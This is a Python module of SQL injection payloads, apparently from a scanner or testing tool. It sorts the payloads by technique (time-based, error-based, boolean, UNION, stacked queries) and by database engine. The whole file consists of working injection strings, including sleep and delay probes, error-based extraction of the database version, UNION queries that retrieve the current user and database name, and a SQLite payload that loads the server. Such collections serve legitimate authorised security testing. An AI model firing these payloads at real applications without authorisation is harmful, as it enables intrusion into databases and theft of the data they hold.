"""
SQL injection payload helpers grouped by detection type and database.
These are reference payloads; adjust to the target application's context.
"""
from typing import Any, Dict, List


def get_time_payloads(db_type: str = "generic") -> List[Dict[str, Any]]:
    payloads = {
        "mysql": [
            {"payload": "' OR SLEEP(5)--", "delay": 5},
            {"payload": "1 AND SLEEP(5)--", "delay": 5},
        ],
        "postgres": [
            {"payload": "'; SELECT pg_sleep(5)--", "delay": 5},
            {"payload": "' OR pg_sleep(5)--", "delay": 5},
        ],
        "mssql": [
            {"payload": "'; WAITFOR DELAY '0:0:5'--", "delay": 5},
            {"payload": "' WAITFOR DELAY '0:0:5'--", "delay": 5},
        ],
        "oracle": [
            {"payload": "' AND dbms_pipe.receive_message(''a'',5)--", "delay": 5},
        ],
        "sqlite": [
            {"payload": "' AND 1=randomblob(500000000)--", "delay": 3},
        ],
        "generic": [
            {"payload": "' OR SLEEP(5)--", "delay": 5},
            {"payload": "'; SELECT pg_sleep(5)--", "delay": 5},
            {"payload": "'; WAITFOR DELAY '0:0:5'--", "delay": 5},
        ],
    }
    return payloads.get(db_type, payloads["generic"])


def get_error_payloads(db_type: str = "generic") -> List[Dict[str, Any]]:
    payloads = {
        "generic": [
            {"payload": "'", "type": "single_quote"},
            {"payload": '"', "type": "double_quote"},
            {"payload": "`", "type": "backtick"},
            {"payload": "1'1", "type": "syntax_error"},
            {"payload": "1 AND 1=CONVERT(int,'a')--", "type": "type_conversion"},
            {"payload": "' AND extractvalue(1,concat(0x7e,version()))--", "type": "extractvalue"},
        ],
        "sqlite": [
            {"payload": "'", "type": "single_quote"},
            {"payload": "' OR '", "type": "unclosed_string"},
            {"payload": "1' AND '1", "type": "syntax_break"},
            {"payload": "' UNION SELECT 1--", "type": "union_error"},
            {"payload": "' ORDER BY 9999--", "type": "order_by_error"},
            {"payload": "1; SELECT 1", "type": "stacked_query"},
        ],
        "mysql": [
            {"payload": "'", "type": "single_quote"},
            {"payload": "' AND extractvalue(1,concat(0x7e,version()))--", "type": "extractvalue"},
            {"payload": "' AND updatexml(1,concat(0x7e,version()),1)--", "type": "updatexml"},
        ],
        "postgres": [
            {"payload": "'", "type": "single_quote"},
            {"payload": "' AND 1=CAST('a' AS INTEGER)--", "type": "cast_error"},
        ],
    }
    return payloads.get(db_type, payloads["generic"])


def get_boolean_payloads() -> List[Dict[str, Any]]:
    return [
        {"true_payload": "' OR '1'='1", "false_payload": "' OR '1'='2"},
        {"true_payload": "' OR 1=1--", "false_payload": "' OR 1=2--"},
        {"true_payload": "1 OR 1=1", "false_payload": "1 AND 1=2"},
        {"true_payload": "' OR 'a'='a", "false_payload": "' OR 'a'='b"},
        {"true_payload": "1' OR '1'='1", "false_payload": "1' AND '1'='2"},
        {"true_payload": "' OR 1=1 OR '1'='1", "false_payload": "' AND 1=2 AND '1'='1"},
    ]


def get_union_payloads() -> List[Dict[str, Any]]:
    return [
        {"payload": "' ORDER BY 3--", "type": "order_by_probe"},
        {"payload": "' ORDER BY 5--", "type": "order_by_probe"},
        {"payload": "' UNION SELECT NULL--", "type": "union_null"},
        {"payload": "' UNION SELECT NULL,NULL--", "type": "union_null_null"},
        {"payload": "' UNION SELECT NULL,NULL,user(),database()--", "type": "union_extract"},
    ]


def get_stacked_payloads(db_type: str = "generic") -> List[Dict[str, Any]]:
    payloads = {
        "postgres": [
            {"payload": "1; SELECT pg_sleep(5)--", "delay": 5},
        ],
        "mssql": [
            {"payload": "1; WAITFOR DELAY '0:0:5'--", "delay": 5},
        ],
        "generic": [
            {"payload": "1; SELECT pg_sleep(5)--", "delay": 5},
        ],
    }
    return payloads.get(db_type, payloads["generic"])
